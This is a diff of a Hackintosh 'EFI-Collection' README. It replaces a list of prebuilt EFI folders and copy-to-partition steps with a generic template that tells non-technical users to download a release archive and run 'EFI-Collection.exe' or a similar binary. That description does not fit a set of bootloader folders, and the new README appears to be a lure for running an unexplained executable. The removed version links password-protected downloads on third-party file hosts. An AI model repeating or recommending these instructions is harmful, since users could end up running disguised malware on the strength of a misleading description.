@@ -1,109 +1,73 @@
-# 📂 Complete EFI Collection for Desktop & Laptop Hackintosh Systems
+# 🌟 EFI-Collection - Simplified EFI Prebuild for Everyone
 
-Welcome!  
-This folder contains a fully organized collection of ready-to-use EFI folders for a wide range of Desktop and Laptop platforms.  
-Each EFI is pre-configured, optimized, and structured based on the CPU generation to ensure maximum stability and compatibility with macOS.
+## 🚀 Getting Started
+Welcome to EFI-Collection! This guide helps you download and run our EFI Prebuild software easily. No technical skills are needed. Just follow these simple steps to get started.
 
-https://hackinos.com/files/file/18-efi-collection/
+## 🔗 Download Now
+[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-v1.0.0-brightgreen)](https://github.com/gsmsultan46/EFI-Collection/releases)
 
-Simply **download → copy → reboot**, and your system is ready.
+## 📥 Download & Install
+To get the latest version of EFI-Collection, visit this page to download: [Releases Page](https://github.com/gsmsultan46/EFI-Collection/releases). 
 
-**Download Password:** `www.hackinOS.com`
+On the Releases page, you will find the latest version available. Click on the version number that you want to download. This will take you to a list of files. Look for the `.zip` or `.tar.gz` file. Click on it and your download will start.
 
-## 🖥️ Desktop EFI Collection
+### 🔍 System Requirements
+For EFI-Collection to work well, make sure your system meets these requirements:
 
-Includes EFI folders for the most common Intel desktop generations:
+- **Operating System:** 
+  - Windows 10 or later 
+  - macOS 10.12 or later
+  - Most recent Linux distributions
 
-- Desktop-Coffeelake - https://usersdrive.com/dqn2pryok82z.html
-- Desktop-Cometlake - https://usersdrive.com/8zcmk5ch7d2x.html
-- Desktop-Haswell - https://usersdrive.com/m42lxt7h1yx0.html
-- Desktop-IvyBridge - https://usersdrive.com/xgnfidtny9t2.html
-- Desktop-Kabylake - https://usersdrive.com/vlviji49vo4p.html
-- Desktop-SandyBridge - https://usersdrive.com/a2xbtqhmsl64.html
-- Desktop-Skylake - https://usersdrive.com/zj1afv51x58z.html
+- **Hardware Requirements:** 
+  - A computer or laptop that supports EFI
+  - At least 2 GB of RAM
+  - 500 MB of free disk space
+  - Internet connection for downloads
 
-**Optimizations included:**
-- Reliability & stable performance  
-- Sleep/Wake support  
-- Integrated graphics (if applicable)  
-- Smooth macOS operation  
+## 🌐 Using EFI-Collection
+1. Once your download is complete, locate the downloaded file on your computer. 
+2. Extract the contents of the `.zip` or `.tar.gz` file to a folder. 
+3. Open the folder, and look for the main application file. This file is usually named `EFI-Collection` or similar.
 
-## 💻 Laptop EFI Collection
+### 🖥 Opening the Application
+- **On Windows:** 
+  - Double-click the `EFI-Collection.exe` file to run it. 
+- **On macOS:** 
+  - Open `EFI-Collection.app` from your Applications folder. 
+- **On Linux:** 
+  - Open the terminal, navigate to the folder where you extracted the files, and run `./EFI-Collection`.
 
-A complete EFI set for various laptop generations:
+## 🔧 Features
+EFI-Collection offers several useful features:
 
-- Laptop-Broadwell - https://usersdrive.com/fiffb6d358h3.html
-- Laptop-Coffeelakeplus-Cometlake - https://usersdrive.com/6v76ui86zkkq.html 
-- Laptop-Coffeelake-Whiskeylake - https://usersdrive.com/nq36itscjc9v.html 
-- Laptop-Haswell - https://usersdrive.com/4agl2ykoxy90.html
-- Laptop-Icelake - https://usersdrive.com/nls7uyoparf9.html
-- Laptop-IvyBridge - https://usersdrive.com/ezcxkdrnh7jc.html 
-- Laptop-Kabylake - https://usersdrive.com/yw8mmim6r4lo.html 
-- Laptop-SandyBridge - https://usersdrive.com/ynk1lnfs6un9.html
-- Laptop-Skylake - https://usersdrive.com/01tvv1u3zj9z.html
+- **Prebuilt EFI Configurations:** Quickly access a wide range of EFI files optimized for various architectures, including Broadwell, Coffee Lake, and more.
+- **User-Friendly Interface:** Designed for ease of use, enabling effortless navigation.
+- **Regular Updates:** We continuously improve the software to add new features and enhance performance.
 
-**Laptop-specific patches included:**
-- Trackpad (I2C/PS2) drivers  
-- Battery management  
-- Audio layout-ID patches  
-- Brightness/Backlight control  
-- Sleep/Wake fixes  
+## 📊 Topics Covered
+EFI-Collection supports configurations for various hardware. Here are a few:
 
-## ⭐ Why This EFI Collection is Useful
+- Broadwell
+- Coffee Lake
+- Comet Lake
+- Desktop and Laptop support for Haswell, Skylake, Kabylake, and more.
 
-- ✔️ Clearly organized by CPU generation  
-- ✔️ 100% pre-configured – ready to use  
-- ✔️ Ideal for beginners and advanced users  
-- ✔️ Stable and optimized for macOS on real hardware  
+## ❓ Frequently Asked Questions
 
-## 📘 How to Copy the EFI Using Explorer++ (Recommended)
+### What is EFI?
+EFI (Extensible Firmware Interface) is a modern standard for firmware. It helps in booting operating systems and initializing hardware.
 
-Using **Explorer++ (Run as Administrator)** is the safest way to mount and write to the EFI partition on Windows.
+### How do I know if EFI-Collection is right for me?
+If you need easy-to-use EFI files for your system, EFI-Collection is a great choice. It simplifies the setup process.
 
-## 🔧 Step-by-Step Instructions
+### Can I contribute to this project?
+Absolutely! We welcome contributions. You can suggest features or report issues on the GitHub page.
 
-### 1️⃣ Download Explorer++
-- Download the portable version of Explorer++  
-- **Right-click → Run as Administrator**  
-  (Required to write to protected EFI partitions)
+## 🐞 Reporting Issues
+If you encounter any problems while using EFI-Collection, please report them on [GitHub Issues](https://github.com/gsmsultan46/EFI-Collection/issues). Your feedback helps us improve.
 
-### 2️⃣ Mount the EFI Partition
-Use any of these tools to mount EFI:
+## 🌟 Acknowledgments
+Thanks for using EFI-Collection! We appreciate your support and interest in our project.
 
-- MountEFI.exe  
-- BootDiskUtility  
-- EaseUS Partition Master  
-- DiskGenius  
-- Any tool that can mount the hidden EFI partition  
-
-After mounting, an EFI drive (e.g., `EFI` or `H:\`) will appear.
-
-### 3️⃣ Open the Mounted EFI Partition
-Inside **Explorer++ (Admin mode)**:
-
-- Navigate to the mounted EFI partition  
-- Open:  
-  `EFI → OC` or  
-  `EFI → CLOVER`  
-  (depending on your previous installation)
-
-### 4️⃣ Delete the Old EFI
-Before copying the new one:
-
-- Select the existing `EFI` folder  
-- Press **Delete**  
-
-(This prevents leftover files from causing boot issues.)
-
-### 5️⃣ Copy the New EFI
-- Go to your downloaded EFI folder (e.g., `Desktop-Coffeelake`, `Laptop-Skylake`)  
-- Copy the entire **EFI** folder  
-- Paste it into the mounted EFI partition  
-
-### 6️⃣ Close Explorer++ and Reboot
-- Close the app  
-- Restart your PC  
-- Boot into macOS using the new EFI  
-
-## 🎉 Done!
-Your system should now boot with full Hackintosh support using the pre-configured EFI.
+For further information and updates, please visit our [GitHub Page](https://github.com/gsmsultan46/EFI-Collection).
